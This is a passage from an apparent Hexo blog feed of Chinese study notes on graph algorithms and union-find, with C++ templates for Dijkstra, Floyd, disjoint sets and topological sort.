class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1.5e5</span> + <span class="number">5</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; PII;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;      <span class="comment">// 点的数量</span></span><br><span class="line"><span class="keyword">int</span> h[maxn], w[maxn], e[maxn], ne[maxn], idx;  <span class="comment">// 邻接表存储所有边</span></span><br><span class="line"><span class="keyword">int</span> dist[maxn];        <span class="comment">// 存储所有点到1号点的距离</span></span><br><span class="line"><span class="keyword">bool</span> st[maxn];     <span class="comment">// 存储每个点的最短距离是否已确定</span></span><br><span class="line"><span class="comment">//加边</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    w[idx] = c; <span class="comment">// 有重边也不要紧，假设1-&gt;2有权重为2和3的边，再遍历到点1的时候2号点的距离会更新两次放入堆中</span></span><br><span class="line">    e[idx] = y; <span class="comment">// 这样堆中会有很多冗余的点，但是在弹出的时候还是会弹出最小值2+x（x为之前确定的最短路径），并</span></span><br><span class="line">    ne[idx] = h[x]; <span class="comment">// 标记st为true，所以下一次弹出3+x会continue不会向下执行。</span></span><br><span class="line">    h[x] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 求1号点到n号点的最短距离，如果不存在，则返回-1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dijkstra</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    priority_queue&lt;PII, <span class="built_in">vector</span>&lt;PII&gt;, greater&lt;PII&gt;&gt; heap;</span><br><span class="line">    heap.push(&#123;<span class="number">0</span>, <span class="number">1</span>&#125;);      <span class="comment">// first存储距离，second存储节点编号</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (heap.size()) &#123;</span><br><span class="line">        <span class="keyword">auto</span> t = heap.top();</span><br><span class="line">        heap.pop();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> ver = t.second, distance = t.first;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (st[ver]) <span class="keyword">continue</span>;</span><br><span class="line">        st[ver] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = h[ver]; i != <span class="number">-1</span>; i = ne[i]) &#123;</span><br><span class="line">            <span class="keyword">int</span> j = e[i];</span><br><span class="line">            <span class="keyword">if</span> (dist[j] &gt; distance + w[i]) &#123;</span><br><span class="line">                dist[j] = distance + w[i];</span><br><span class="line">                heap.push(&#123;dist[j], j&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dist[n] == <span class="number">0x3f3f3f3f</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-单源-Bellman-Ford算法"><a href="#2-单源-Bellman-Ford算法" class="headerlink" title="2 单源 Bellman-Ford算法"></a>2 单源 Bellman-Ford算法</h1><p>一维数组dist[]来存储每个点到起点的距离，初始化dist[S]  = 0，其他初始化为INF。</p><p>找到从起点到某个点的最短路，设起点为S，终点为D，那这条最短路一定是$S-&gt;P_1-&gt;P_2-&gt;…-&gt;D$的形式，假设<strong>没有负权环</strong>，那这条路径上的点的总个数一定<strong>不大于n</strong>。</p><p>定义对点x, y的松弛操作是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dist[y] = min(dist[y], dist[x] + e[x][y]);<span class="comment">//这里的e[x][y]表示x、y之间的距离，具体形式可能根据存图方法不同而改变</span></span><br></pre></td></tr></table></figure><p>松弛操作就相当于考察能否<strong>经由x点</strong>使<strong>起点到y点</strong>的距离变短。</p><p>所以要找到最短路，只需要进行以下步骤：</p><ol><li>先松弛$S$, $P_1$，此时$dist[P_1]$必然等于$e[S][P_1]$</li><li>再松弛$P_1, P_2$，因为$S-&gt;P_1-&gt;P_2$是最短路的一部分，<strong>最短路的子路也是最短路</strong>（这是显然的），所以$dist[P_2]$不可能小于$dist[P_1]+e[P_1][P_2]$，因此它会被更新为$dist[P1]+e[P1][P2]$，即$e[S][P1]+e[P1][P2]$。</li><li>再松弛$P2, P3$，……以此类推，最终$dist[D]$必然等于$e[S][P1]+e[P1][P2]+…$，这恰好就是最短路径。</li></ol><p><strong>把所有边松弛n-1遍！</strong></p><p><a href="https://zhuanlan.zhihu.com/p/96621396" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/96621396</a></p><p><a href="https://blog.csdn.net/luomingjun12315/article/details/50377525" target="_blank" rel="noopener">https://blog.csdn.net/luomingjun12315/article/details/50377525</a></p><h1 id="3-单源-SPFA算法"><a href="#3-单源-SPFA算法" class="headerlink" title="3 单源 SPFA算法"></a>3 单源 SPFA算法</h1><p><strong>SPFA算法</strong>，也就是<strong>队列优化</strong>的Bellman-Ford算法，维护一个队列。</p><h1 id="4-全源-Floyd算法"><a href="#4-全源-Floyd算法" class="headerlink" title="4 全源 Floyd算法"></a>4 全源 Floyd算法</h1><p>求出每一对顶点之间的最短路径。Floyd本质上是一个<strong>动态规划</strong>的思想，每一次循环更新<strong>经由k点，i到j的最短路径</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 算法结束后，d[a][b]表示a到b的最短距离，path存放路径信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">floyd</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//初始化：</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ )</span><br><span class="line">            <span class="keyword">if</span> (i == j) d[i][j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span> d[i][j] = inf;</span><br><span class="line">    <span class="comment">//memset(path, -1, sizeof path);</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//dp </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= n; k ++ ) &#123;<span class="comment">//考虑以k为中转点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (d[i][j] &gt; d[i][k] + d[k][j]) &#123;<span class="comment">//以k为中转点的路径更短</span></span><br><span class="line">                d[i][j] = d[i][k] + d[k][j];<span class="comment">//更新最短路径长度</span></span><br><span class="line">                    <span class="comment">//path[i][j] = k;//中转点</span></span><br><span class="line">                &#125;     </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="5-全源-Johnson算法"><a href="#5-全源-Johnson算法" class="headerlink" title="5 全源 Johnson算法"></a>5 全源 Johnson算法</h1><h1 id="6-BFS算法"><a href="#6-BFS算法" class="headerlink" title="6 BFS算法"></a>6 BFS算法</h1><p>该算法求单源最短路径只适用于无权图，或所有边的权值都相同的图。</p><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><ol><li><a href="https://www.acwing.com/problem/content/851/" target="_blank" rel="noopener">acwing模板题目——Dijkstra求最短路 I</a></li><li><a href="https://www.acwing.com/problem/content/852/" target="_blank" rel="noopener">Dijkstra求最短路 II</a></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并查集</title>
      <link href="/2021/04/09/%E5%B9%B6%E6%9F%A5%E9%9B%86/"/>
      <url>/2021/04/09/%E5%B9%B6%E6%9F%A5%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="简介"><a href="#简介" class="headerlink" title="简介　　"></a>简介　　</h1><p>英文：Disjoint Set，即“不相交集合”。将编号分别为$1…N$的$N$个对象划分为不相交集合，在每个集合中，选择其中某个元素代表所在集合。常见两种操作：</p><ol><li>合<strong>并</strong>两个集合；</li><li><strong>查</strong>找某元素属于哪个集合。</li></ol><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><h2 id="1-无优化"><a href="#1-无优化" class="headerlink" title="1 无优化"></a>1 无优化</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span>;</span><br><span class="line"><span class="keyword">int</span> node[maxn];<span class="comment">//每个节点的父节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=n; i++ )&#123;</span><br><span class="line">        node[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找当前元素所在树的根节点(代表元素)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x == node[x])</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">return</span> find(node[x]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//合并x和y所在的集合</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> root_x = find(x);<span class="comment">//找到根节点</span></span><br><span class="line">    <span class="keyword">int</span> root_y = find(y);</span><br><span class="line">    <span class="keyword">if</span> (root_x == root_y)<span class="comment">//两者根节点相同</span></span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    node[root_x] = root_y;<span class="comment">//将x的根节点与y的根节点相连</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断xy是否属于一个集合</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">same</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> find(x) == find(y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-优化-路径压缩-按秩合并"><a href="#2-优化-路径压缩-按秩合并" class="headerlink" title="2 优化(路径压缩+按秩合并)"></a>2 优化(路径压缩+按秩合并)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span>;</span><br><span class="line"><span class="keyword">int</span> node[maxn];<span class="comment">//每个节点的父节点</span></span><br><span class="line"><span class="keyword">int</span> Rank[maxn];<span class="comment">//树的高度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=n; i++) &#123;</span><br><span class="line">        node[i] = i;</span><br><span class="line">        Rank[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//路径压缩</span></span><br><span class="line"><span class="comment">//查找当前元素所在树的根节点(代表元素)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x == node[x])</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">return</span> node[x] = find(node[x]);<span class="comment">//在第一次查找时，将节点直连到根节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//按秩合并</span></span><br><span class="line"><span class="comment">//合并x和y所在的集合</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> root_x = find(x);<span class="comment">//找到根节点</span></span><br><span class="line">    <span class="keyword">int</span> root_y = find(y);</span><br><span class="line">    <span class="keyword">if</span> (root_x == root_y)<span class="comment">//两者根节点相同</span></span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    <span class="comment">//判断两棵树的高度，然后在决定谁为子树</span></span><br><span class="line">    <span class="keyword">if</span> (Rank[root_x] &lt; Rank[root_y])</span><br><span class="line">        node[root_x] = root_y;<span class="comment">//将x的根节点接到y的根节点下</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        node[root_y] = root_x;<span class="comment">//将y的根节点与x的根节点下</span></span><br><span class="line">        <span class="keyword">if</span> (Rank[root_x] == Rank[root_y])<span class="comment">//树的高度相同</span></span><br><span class="line">            Rank[root_x]++;<span class="comment">//root_x树高度+1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断xy是否属于一个集合</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">same</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> find(x) == find(y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h1><p>直接实现的话，时间复杂度最坏可以到$O(n)$。<br>两个常见优化，启发式合并，路径压缩。</p><ul><li>启发式合并：把大小较小的集合挂在较大的集合上。（有的写法是考虑深度而不是大小）</li><li>路径压缩：询问过的点到根节点的路径，都直接挂在根节点上。</li></ul><p>实现其中任意一个时间复杂度变为$O(\log n)$。<br>实现其中两个，时间复杂度变为$O(\alpha(n))$，其中$\alpha(n)$是阿克曼函数的反函数，可以认为非常小。</p><p>多数情况下为了简单，都实现路径压缩（只需要一句赋值）而不实现启发式合并（需要记录大小）</p><p>在某些题目中由于会爆栈，需要使用非递归的find函数。</p><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><ol><li><a href="https://www.luogu.com.cn/problem/P3367" target="_blank" rel="noopener">洛谷——P3367 【模板】并查集</a></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关键路径</title>
      <link href="/2021/04/09/%E5%85%B3%E9%94%AE%E8%B7%AF%E5%BE%84/"/>
      <url>/2021/04/09/%E5%85%B3%E9%94%AE%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>概念</strong>：</p><ol><li>AOE网（Activity On Edge Network，用顶点表示活动的网）：在带权有向图中，以顶点表示事件，以有向边表示活动，以边上的权值表示完成该活动的开销（如完成活动所需的时间），称之为用边表示活动的网络。</li><li>在AOE网中仅有一个入度为0的顶点，称为开始顶点（源点），它表示整个工程的开始；也仅有一个出度为0的顶点，称为结束顶点（汇点），它表示整个工程的结束。</li><li>从源点到汇点的有向路径可能有多条，所有路径中，具有最大路径长度的路径称为关键路径，而把关键路径上的活动称为关键活动。</li><li>完成整个工程的最短时间就是关键路径的长度，若关键活动不能按时完成，则整个工程的完成时间就会延长。</li></ol><p><strong>性质</strong>：</p><ol><li>只有在某顶点所代表的事件发生后，从该顶点出发的各有向边所代表的活动才能开始；</li><li>只有在进入某顶点的各有向边所代表的活动都已结束时，该顶点所代表的事件才能发生。另外，有些活动是可以并行进行的。</li></ol><p><strong>求解关键路径的一些定义</strong>：</p><ul><li>事件$v_k$的最早发生时间$ve{(k)}$——决定了所有以$v_k$开始的活动能够开工的最早时间</li><li>活动$a_i$的最早开始时间$e(i)$——指该活动弧的起点所表示的事件的最早发生时间</li><li>事件$v_k$的最迟发生时间$vl(k)$——它是指在不推迟整个工程完成的前提下，该事件最迟必须发生的时间。</li><li>活动$a_i$的最迟开始时间$l(i)$——它是指该活动弧的终点所表示事件的最迟发生时间与该活动所需时间之差。</li><li>活动$a_i$的时间余量$d(i)=l(i)-e(i)$，表示在不增加完成整个工程所需总时间的情况下，活动$a_i$可以拖延的时间</li><li>若一个活动的时间余量为零，则说明该活动必须要如期完成，$d(i)=0$的活动$a_i$是关键活动；由关键活动组成的路径就是关键路径。</li></ul><p><strong>求解关键路径的步骤</strong>：</p><ol><li><p>求所有事件的最早发生时间$ve()$</p><ul><li>按拓扑排序序列，依次求各个顶点的 $v e(k)$ :<br>$v e($ 源点 $)=0$<br>$v e(k)=\operatorname{Max}\left{v \mathrm{e}(j)+\operatorname{Weight}\left(v<em>{j}, v</em>{k}\right)\right}, \quad v<em>{j}$ 为 $v</em>{k}$ 的任意前驱</li></ul></li><li><p>求所有事件的最迟发生时间$vl()$</p><ul><li><p>按逆拓扑排序序列，依次求各个顶点的 $v l(\boldsymbol{k})$ :<br>$v l($ 汇点 $)=v e( 汇点)$ </p><p>$v l(k)=\operatorname{Min}\left{v l(j)-\operatorname{Weight}\left(v<em>{k}, v</em>{j}\right)\right}, v<em>{j}$ 为 $v</em>{k}$ 的任意后继</p></li></ul></li><li><p>求所有活动的最早发生时间$e()$</p><ul><li>若边 $<v_{k}, v_{j}>$ 表示活动 $a_{i}$, 则有 $e(i)=v e(k)$</v_{k},></li></ul></li><li><p>求所有活动的最迟发生时间$l()$</p><ul><li>若边 $<v_{k}, v_{j}>$ 表示活动 $a<em>{i}$, 则有 $l(i)=v l(j)-$ Weight $\left(v</em>{k}, v_{j}\right)$</v_{k},></li></ul></li><li><p>求所有活动的时间余量$d()$</p><ul><li>$d(i)=l(i)-e(i)$</li></ul></li></ol><p><strong>关键活动、关键路径的特性</strong>：</p><ol><li>若关键活动耗时增加，则整个工程的工期将增长</li><li>缩短关键活动的时间，可以缩短整个工程的工期</li><li>当缩短到一定程度时，关键活动可能会变成非关键活动</li><li>可能有多条关键路径，只提高一条关键路径上的关键活动速度并不能缩短整个工程的工期，只有加快那些包括在所有关键路径上的关键活动才能达到缩短工期的目的。</li></ol><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><ol><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拓扑排序</title>
      <link href="/2021/04/09/%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F/"/>
      <url>/2021/04/09/%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>有向无环图：若一个有向图中不存在环，则称为有向无环图，简称DAG图（Directed Acyclic Graph）</p><p>AOV网（Activity On Vertex Network，用顶点表示活动的网）：用DAG表示一个工程，顶点表示活动，有向边$<v_i,v_j>$表示活动$V_i$必须先于$V_j$进行。</v_i,v_j></p><p>拓扑排序是一个有向无环图(DAG)的所有顶点的线性序列，且该序列必须满足下面两个条件：</p><ol><li>每个顶点出现且只出现一次。</li><li>若存在一条从顶点 A 到顶点 B 的路径，那么在序列中顶点 A 出现在顶点 B 的前面。</li></ol><p><strong>实现</strong>：</p><ol><li>从AOV网中选择一个没有前驱（入度为0）的顶点并输出；</li><li>从网中删除该顶点和所有以它为起点的有向边；</li><li>重复1和2直到当前的AOV网为空或当前网中不存在无前驱的顶点为止（说明有回路）。</li></ol><p><strong>逆拓扑序</strong>：</p><ol><li>从AOV网中选择一个没有后继（出度为0）的顶点并输出；</li><li>从网中删除该顶点和所有以它为终点的有向边；</li><li>重复1和2直到当前的AOV网为空。</li></ol><p><strong>思路</strong>：</p><ol><li>用一种容器（比如栈，队列，集合）维护当前所有入度为0的点。</li><li>每次从容器中取出一个点，删掉他和他的出边，这可能导致一些点入度为0，将新的入度为0的点加入容器。</li></ol><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>邻接表：时间复杂度 $O(n+m)$, $n$ 表示点数，$m$ 表示边数</p><p>邻接矩阵：时间复杂度 $O(n^2)$</p><p>也可以使用dfs实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span> + <span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxe = <span class="number">2e5</span> + <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;      <span class="comment">// 点的数量</span></span><br><span class="line"><span class="keyword">int</span> h[maxn], e[maxe], ne[maxe], idx;  <span class="comment">// 邻接表存储所有边</span></span><br><span class="line"><span class="keyword">int</span> d[maxn];<span class="comment">//每个点的入度 </span></span><br><span class="line"><span class="keyword">int</span> print[maxn];<span class="comment">//拓扑序列 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//加边</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    e[idx] = y; <span class="comment">// 这样堆中会有很多冗余的点，但是在弹出的时候还是会弹出最小值2+x（x为之前确定的最短路径），并</span></span><br><span class="line">    ne[idx] = h[x]; <span class="comment">// 标记st为true，所以下一次弹出3+x会continue不会向下执行。</span></span><br><span class="line">    h[x] = idx++;</span><br><span class="line">    d[y]++;<span class="comment">//入度 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拓扑排序 </span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">topsort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; s;<span class="comment">//存储入度为0的点 </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// d[i] 存储点i的入度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">        <span class="keyword">if</span> (!d[i])<span class="comment">//将所有入度为0的点入栈 </span></span><br><span class="line">            s.push(i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cnt = <span class="number">0</span>;<span class="comment">//记录当前已经输出的顶点数 </span></span><br><span class="line">    <span class="keyword">while</span> (!s.empty()) &#123;<span class="comment">//栈不空，存在入度为0的顶点 </span></span><br><span class="line">        <span class="keyword">int</span> t = s.top();</span><br><span class="line">        s.pop();</span><br><span class="line">        print[cnt++] = t; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i]) &#123;</span><br><span class="line">            <span class="keyword">int</span> j = e[i];</span><br><span class="line">            <span class="keyword">if</span> (-- d[j] == <span class="number">0</span>)</span><br><span class="line">                s.push(j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果所有点都入队了，说明存在拓扑序列；否则不存在拓扑序列。</span></span><br><span class="line">    <span class="keyword">return</span> cnt == n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><ol><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最小生成树</title>
      <link href="/2021/04/09/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/"/>
      <url>/2021/04/09/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/</url>
      
